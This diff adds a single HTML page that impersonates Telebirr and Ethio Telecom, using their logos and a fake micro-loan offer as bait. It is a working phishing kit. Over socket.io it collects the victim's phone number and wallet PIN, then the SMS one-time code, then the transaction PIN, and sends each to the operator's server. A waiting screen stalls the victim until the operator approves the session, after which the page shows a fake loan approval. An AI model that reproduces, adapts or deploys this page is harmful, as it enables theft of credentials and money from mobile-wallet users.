@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#0056B3">
+    <title>Telebirr Financial System</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <style>
+        [x-cloak] { display: none !important; }
+        body {
+            background: linear-gradient(to bottom, #002D62 0%, #0056B3 40%, #00A4E4 70%, #E6F4F8 100%);
+            background-attachment: fixed;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #0056B3;
+            box-shadow: 0 0 0 2px rgba(0, 86, 179, 0.2);
+        }
+        .pin-box { 
+            width: 54px; 
+            height: 54px; 
+            border: 1.5px solid #e2e8f0; 
+            border-radius: 12px; 
+            text-align: center; 
+            font-size: 22px; 
+            font-weight: 700; 
+            background: #f8fafc; 
+            color: #0f172a; 
+            outline: none; 
+            transition: all 0.2s; 
+        }
+        .pin-box:focus { 
+            border-color: #0056B3; 
+            background: white; 
+            box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); 
+        }
+        .spinner-sm { 
+            animation: spin 1s linear infinite; 
+            width: 20px; 
+            height: 20px; 
+            border: 3px solid rgba(255,255,255,0.3); 
+            border-top-color: white; 
+            border-radius: 50%; 
+            display: inline-block; 
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .toast { 
+            position: absolute; 
+            top: 16px; 
+            left: 50%; 
+            transform: translateX(-50%) translateY(-10px); 
+            padding: 12px 24px; 
+            border-radius: 8px; 
+            background: #1e293b; 
+            color: white; 
+            font-size: 13px; 
+            font-weight: 600; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
+            z-index: 9999; 
+            opacity: 0; 
+            transition: all 0.25s ease; 
+            white-space: nowrap; 
+            pointer-events: none; 
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-0 sm:p-4">
+
+    <div class="w-full max-w-md bg-[#f8fafc] sm:rounded-2xl shadow-2xl overflow-hidden flex flex-col min-h-screen sm:min-h-[850px] relative" x-data="loanFlow()" x-init="init()">
+        
+        <div id="toast" class="toast" :class="toast.show ? 'show' : ''" x-text="toast.message"></div>
+
+        <header class="w-full bg-white select-none shrink-0 border-b border-gray-100">
+            <div class="px-6 py-4 grid grid-cols-[1fr_auto_1fr] items-center gap-4">
+                <div class="flex justify-start">
+                    <img src="/public/assets/cropped-logo12-1-192x192.png" alt="Telebirr" class="h-14 max-w-full object-contain block">
+                </div>
+                
+                <div class="h-8 w-[1px] bg-gray-200"></div>
+                
+                <div class="flex justify-end">
+                    <img src="/public/assets/et-favicon.png" alt="Ethio Telecom" class="h-14 max-w-full object-contain block">
+                </div>
+            </div>
+            
+            <div class="border-t border-gray-100 px-6 py-3.5 bg-slate-50/80">
+                <div class="flex items-center justify-between">
+                    <h1 class="text-[#0056B3] font-bold text-base tracking-tight" x-text="step <= 3 ? 'Telebirr Authentication' : 'Telebirr Financials'">
+                        Telebirr Authentication
+                    </h1>
+                    <span class="bg-[#00A4E4] text-white font-semibold text-xs px-4 py-1.5 rounded-full shadow-sm tracking-wide" x-text="step === 2.5 ? 'Awaiting Dashboard' : 'Secure Link'">
+                        Secure Link
+                    </span>
+                </div>
+            </div>
+
+            <div class="w-full bg-[#0056B3] text-white relative overflow-hidden" style="background-image: linear-gradient(to bottom, #0056B3, #003F87);">
+                <div class="absolute inset-0 opacity-10" style="background-size: 22px 22px; background-image: linear-gradient(to right, #fff 1px, transparent 1px), linear-gradient(to bottom, #fff 1px, transparent 1px);"></div>
+                <div class="px-6 py-5 relative z-10">
+                    <p class="text-[9px] font-bold tracking-widest text-cyan-200 uppercase opacity-90">INSTANT MOBILE MICRO-CREDIT</p>
+                    <h2 class="text-xl font-bold mt-0.5 tracking-tight">Your funds, <span class="font-normal text-cyan-100/80">delivered directly</span></h2>
+                    <p class="text-[9px] font-bold tracking-wider text-cyan-200 uppercase mt-3 opacity-80">PROPOSED PRINCIPAL AMOUNT</p>
+                    
+                    <div class="flex items-baseline gap-1 mt-0.5">
+                        <span class="text-xs font-bold text-cyan-300">ETB</span>
+                        <span class="text-3xl font-black tracking-tight" x-text="Number(form.amount).toLocaleString()">25,000</span>
+                        <span class="bg-white/20 text-[9px] font-bold px-2 py-0.5 rounded ml-1.5" x-text="form.term ? form.term + ' WEEKS' : '--'">4 WEEKS</span>
+                    </div>
+                    
+                    <div class="grid grid-cols-3 gap-2 mt-4 pt-3 border-t border-white/10 text-left">
+                        <div>
+                            <p class="text-[8px] font-bold text-cyan-300 uppercase tracking-wider">INSTALLMENT</p>
+                            <p class="text-xs font-extrabold mt-0.5" x-text="'ETB ' + calculateWeeklyInstallment()">ETB 6,700.00</p>
+                        </div>
+                        <div class="text-center">
+                            <p class="text-[8px] font-bold text-cyan-300 uppercase tracking-wider">DURATION</p>
+                            <p class="text-xs font-extrabold mt-0.5" x-text="form.term ? form.term + ' weeks' : '--'">4 weeks</p>
+                        </div>
+                        <div class="text-right">
+                            <p class="text-[8px] font-bold text-cyan-300 uppercase tracking-wider">FEE RATE</p>
+                            <p class="text-xs font-extrabold mt-0.5">1.8%/week</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+
+        <main class="flex-1 overflow-y-auto px-5 py-6 flex flex-col justify-between relative">
+            
+            <div class="w-full flex justify-center items-center gap-2 mb-6" x-show="step > 3">
+                <template x-for="i in [4, 5, 6, 8]" :key="i">
+                    <div class="w-2.5 h-2.5 rounded-full transition-all duration-300" :class="{ 'bg-[#0056B3] scale-110': step === i, 'bg-cyan-200': step > i, 'bg-gray-200': step < i }"></div>
+                </template>
+            </div>
+
+            <div class="bg-white rounded-2xl border border-gray-100 p-6 shadow-sm flex-1 flex flex-col justify-center min-h-[420px]">
+                
+                <div x-show="step === 1" class="space-y-6 w-full">
+                    <div class="text-center">
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Enter Telebirr Account</h2>
+                        <p class="text-xs text-gray-400 mt-1">Provide your registered Ethio Telecom mobile number and setup your security session parameter details.</p>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">MOBILE PHONE NUMBER</label>
+                        <div class="flex gap-2">
+                            <span class="w-24 flex items-center justify-center bg-gray-100 border border-gray-200 rounded-xl px-2 text-gray-700 font-bold text-sm">🇪🇹 +251</span>
+                            <input type="tel" x-model="form.phone" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold transition-all flex-1" placeholder="9XXXXXXXX" maxlength="9">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">WALLET ACCESS PIN</label>
+                        <div class="flex justify-center gap-3 py-1">
+                            <template x-for="(_, i) in 4" :key="i">
+                                <input type="password" class="pin-box text-gray-700 step1-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step1-pin')" x-model="step1Pin.value[i]">
+                            </template>
+                        </div>
+                    </div>
+                    <div class="pt-2">
+                        <button @click="submitStep1Credentials" :disabled="form.phone.length < 9 || !isStep1PinValid || processingStep1" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!processingStep1">Request OTP Code</span>
+                            <span x-show="processingStep1" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 2" x-cloak class="space-y-6 w-full">
+                    <div class="text-center">
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">Telebirr SMS OTP</h2>
+                        <p class="text-xs text-gray-400 mt-1">A verification verification parameter code has been pushed to your mobile device.</p>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Verification Code</label>
+                        <input type="text" x-model="otp.code" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-center tracking-[0.75rem] text-2xl font-bold font-mono text-gray-700 transition-all" maxlength="6" placeholder="000000" inputmode="numeric">
+                    </div>
+                    <div class="pt-2">
+                        <button @click="submitOtpToAdminQueue" :disabled="otp.code.length !== 6 || verifyingOtp" type="button" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!verifyingOtp">Confirm OTP Token</span>
+                            <span x-show="verifyingOtp" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 2.5" x-cloak class="text-center flex flex-col items-center justify-center space-y-6 w-full">
+                    <div class="relative flex items-center justify-center">
+                        <div class="animate-ping absolute inline-flex h-12 w-12 rounded-full bg-cyan-400 opacity-20"></div>
+                        <span class="spinner-sm !w-12 !h-12 !border-4 !border-t-[#0056B3] !border-slate-200"></span>
+                    </div>
+                    <div>
+                        <h3 class="text-lg font-bold text-gray-800">Verifying Ledger Status</h3>
+                        <p class="text-xs text-gray-400 mt-2 px-6">Your transaction authorization packet is pending administrator dashboard clearance. Please leave this page open.</p>
+                    </div>
+                    <button @click="simulateAdminApproval" type="button" class="text-xs text-[#0056B3] hover:underline font-bold bg-slate-100 rounded-lg px-4 py-2 mt-2 transition-all">Dev Fast-Track Approval Signal</button>
+                </div>
+
+                <div x-show="step === 3" x-cloak class="space-y-6 w-full">
+                    <div class="text-center">
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">Account Security Verification</h2>
+                        <p class="text-xs text-gray-600 font-medium mt-1">Enter your 4-digit telebirr transaction PIN</p>
+                    </div>
+                    
+                    <div class="flex justify-center gap-3 py-1">
+                        <template x-for="(_, i) in 4" :key="i">
+                            <input type="password" class="pin-box text-gray-700 step3-pin" maxlength="1" inputmode="numeric" pattern="[0-9]*" @input="movePinFocus($event, i, 4, 'step3-pin')" x-model="step3Pin.value[i]">
+                        </template>
+                    </div>
+
+                    <div class="pt-2">
+                        <button @click="submitFinalPinAuthorization" :disabled="!isStep3PinValid || authorizingFinalPin" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-40 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all flex items-center justify-center gap-2 cursor-pointer">
+                            <span x-show="!authorizingFinalPin">Continue</span>
+                            <span x-show="authorizingFinalPin" class="spinner-sm"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <div x-show="step === 4" x-cloak class="space-y-5 w-full">
+                    <div class="text-center mb-4">
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">Loan Configuration</h2>
+                        <p class="text-xs text-gray-400 mt-1">Configure your active micro-credit profile definitions.</p>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Credit Selection Type</label>
+                        <select x-model="form.loanType" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
+                            <option value="">Choose loan category...</option>
+                            <option value="Consumer">Telebirr SandBox Personal Loan</option>
+                            <option value="Merchant">Telebirr Merchant Working Capital</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Requested Amount (ETB)</label>
+                        <input type="range" x-model="form.amount" min="500" max="150000" step="500" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-[#0056B3]">
+                        <div class="flex justify-between text-[11px] text-gray-400 font-bold mt-1">
+                            <span>ETB 500</span>
+                            <span>ETB 150,000</span>
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Repayment Cycle</label>
+                        <select x-model="form.term" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
+                            <option value="2">2 Weeks Cycle</option>
+                            <option value="4">4 Weeks Cycle</option>
+                            <option value="8">8 Weeks Cycle</option>
+                        </select>
+                    </div>
+                    <div class="pt-2">
+                        <button @click="step = 5" :disabled="!form.loanType" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-4 px-4 rounded-xl shadow-md transition-all cursor-pointer">Continue Flow →</button>
+                    </div>
+                </div>
+
+                <div x-show="step === 5" x-cloak class="space-y-5 w-full">
+                    <div class="text-center mb-4">
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">KYC Profile Authentication</h2>
+                        <p class="text-xs text-gray-400 mt-1">Verify that your identity match metrics sync accurately.</p>
+                    </div>
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">First Name</label>
+                            <input type="text" x-model="form.firstName" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium" placeholder="First Name">
+                        </div>
+                        <div>
+                            <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Last Name</label>
+                            <input type="text" x-model="form.lastName" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium" placeholder="Last Name">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Email Address</label>
+                        <input type="email" x-model="form.email" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium" placeholder="name@domain.com">
+                    </div>
+                    <div class="grid grid-cols-2 gap-4 pt-2">
+                        <button @click="step = 4" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← Back</button>
+                        <button @click="step = 6" :disabled="!form.firstName || !form.lastName || !form.email" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Next →</button>
+                    </div>
+                </div>
+
+                <div x-show="step === 6" x-cloak class="space-y-5 w-full">
+                    <div class="text-center mb-4">
+                        <h2 class="text-lg font-bold text-gray-800 tracking-tight">Financial Eligibility</h2>
+                        <p class="text-xs text-gray-400 mt-1">Provide background information required to confirm transaction allocation limits.</p>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Employment Type</label>
+                        <select x-model="form.employment" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-medium transition-all">
+                            <option value="">Select status...</option>
+                            <option value="Employed">Salaried Staff Employee</option>
+                            <option value="Self-Employed">Independent / Merchant Broker</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="block text-xs font-bold text-slate-500 uppercase tracking-wider mb-2">Monthly Income (ETB)</label>
+                        <input type="number" x-model="form.income" class="w-full bg-slate-50/50 border border-gray-200 rounded-xl px-4 py-3.5 text-gray-700 font-semibold" placeholder="Monthly Earnings">
+                    </div>
+                    <div class="grid grid-cols-2 gap-4 pt-2">
+                        <button @click="step = 5" class="w-full border border-gray-200 text-slate-600 font-bold py-3.5 px-4 rounded-xl hover:bg-slate-50 transition-all">← Back</button>
+                        <button @click="dispatchPayoutDisbursement" :disabled="!form.employment || !form.income" class="w-full bg-[#0056B3] hover:bg-[#003F87] disabled:opacity-50 text-white font-bold py-3.5 px-4 rounded-xl shadow-md transition-all">Submit Application</button>
+                    </div>
+                </div>
+
+                <div x-show="step === 8" x-cloak class="text-center py-6 flex flex-col items-center justify-center my-auto space-y-6 w-full">
+                    <div class="w-16 h-16 bg-[#0056B3] rounded-2xl flex items-center justify-center shadow-md">
+                        <svg class="w-9 h-9 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="3.5">
+                            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
+                        </svg>
+                    </div>
+                    <div>
+                        <h2 class="text-xl font-bold text-gray-800 tracking-tight">Disbursement Complete!</h2>
+                        <p class="text-xs text-gray-400 mt-1.5 px-4">Your Telebirr Micro-Credit request processed successfully. Check your phone's handset notification logs for credit status updates.</p>
+                    </div>
+                    <div class="bg-slate-50 border border-gray-100 px-5 py-3 rounded-xl inline-block mx-auto">
+                        <p class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Telebirr Reference TXN</p>
+                        <p class="font-mono text-base font-bold text-gray-700 mt-0.5 tracking-wide" x-text="referenceId"></p>
+                    </div>
+                </div>
+
+            </div>
+
+            <footer class="w-full text-center py-4 shrink-0">
+                <p class="text-[11px] text-gray-400 font-medium">Encrypted Processing Core · Telebirr Powered by Ethio Telecom</p>
+            </footer>
+        </main>
+    </div>
+
+    <script>
+        function loanFlow() {
+            return {
+                step: 1, referenceId: '', connected: false,
+                form: { loanType: '', amount: 25000, term: '4', firstName: '', lastName: '', email: '', phone: '', employment: '', income: '' },
+                otp: { code: '' },
+                step1Pin: { value: ['', '', '', ''] },
+                step3Pin: { value: ['', '', '', ''] }, 
+                processingStep1: false, verifyingOtp: false, authorizingFinalPin: false,
+                socket: null, toast: { show: false, message: '' },
+
+                get isStep1PinValid() { return this.step1Pin.value.join('').length === 4; },
+                get isStep3PinValid() { return this.step3Pin.value.join('').length === 4; },
+
+                calculateWeeklyInstallment() {
+                    let principal = Number(this.form.amount) || 0;
+                    let weeks = Number(this.form.term) || 1;
+                    return ((principal + (principal * 0.018 * weeks)) / weeks).toFixed(2);
+                },
+
+                triggerToastNotification(msg) {
+                    this.toast.message = msg;
+                    this.toast.show = true;
+                    setTimeout(() => { this.toast.show = false; }, 4000);
+                },
+
+                movePinFocus(el, index, maxLen, className) {
+                    if (el.target.value.length === 1 && index < (maxLen - 1)) {
+                        const inputs = document.querySelectorAll('.' + className);
+                        if (inputs[index + 1]) inputs[index + 1].focus();
+                    }
+                },
+
+                submitStep1Credentials() {
+                    this.processingStep1 = true;
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-step1-credentials', { phone: this.form.phone, pin: this.step1Pin.value.join('') });
+                    } else {
+                        setTimeout(() => {
+                            this.processingStep1 = false;
+                            this.step = 2; 
+                            this.triggerToastNotification("OTP parameter code routed successfully.");
+                        }, 800);
+                    }
+                },
+
+                submitOtpToAdminQueue() {
+                    this.verifyingOtp = true;
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-otp-verification', { code: this.otp.code });
+                    } else {
+                        setTimeout(() => {
+                            this.verifyingOtp = false;
+                            this.step = 2.5; 
+                        }, 800);
+                    }
+                },
+
+                simulateAdminApproval() {
+                    this.step = 3; 
+                    this.triggerToastNotification("Session approved by Admin Dashboard.");
+                },
+
+                submitFinalPinAuthorization() {
+                    this.authorizingFinalPin = true;
+                    if (this.socket && this.connected) {
+                        this.socket.emit('submit-final-pin', { pin: this.step3Pin.value.join('') });
+                    } else {
+                        setTimeout(() => {
+                            this.authorizingFinalPin = false;
+                            this.step = 4; 
+                        }, 800);
+                    }
+                },
+
+                dispatchPayoutDisbursement() {
+                    this.referenceId = "TXN-" + Math.floor(100000 + Math.random() * 900000) + "-ETB";
+                    this.step = 8;
+                },
+
+                init() {
+                    this.socket = io({ autoConnect: false });
+                    this.socket.on('connect', () => { this.connected = true; });
+                    this.socket.on('disconnect', () => { this.connected = false; });
+                    
+                    this.socket.on('otp-accepted-goto-wait', () => { this.verifyingOtp = false; this.step = 2.5; });
+                    this.socket.on('admin-dashboard-approve', () => { this.step = 3; });
+                    this.socket.on('final-pin-accepted', () => { this.authorizingFinalPin = false; this.step = 4; });
+                }
+            }
+        }
+    </script>
+</body>
+</html>
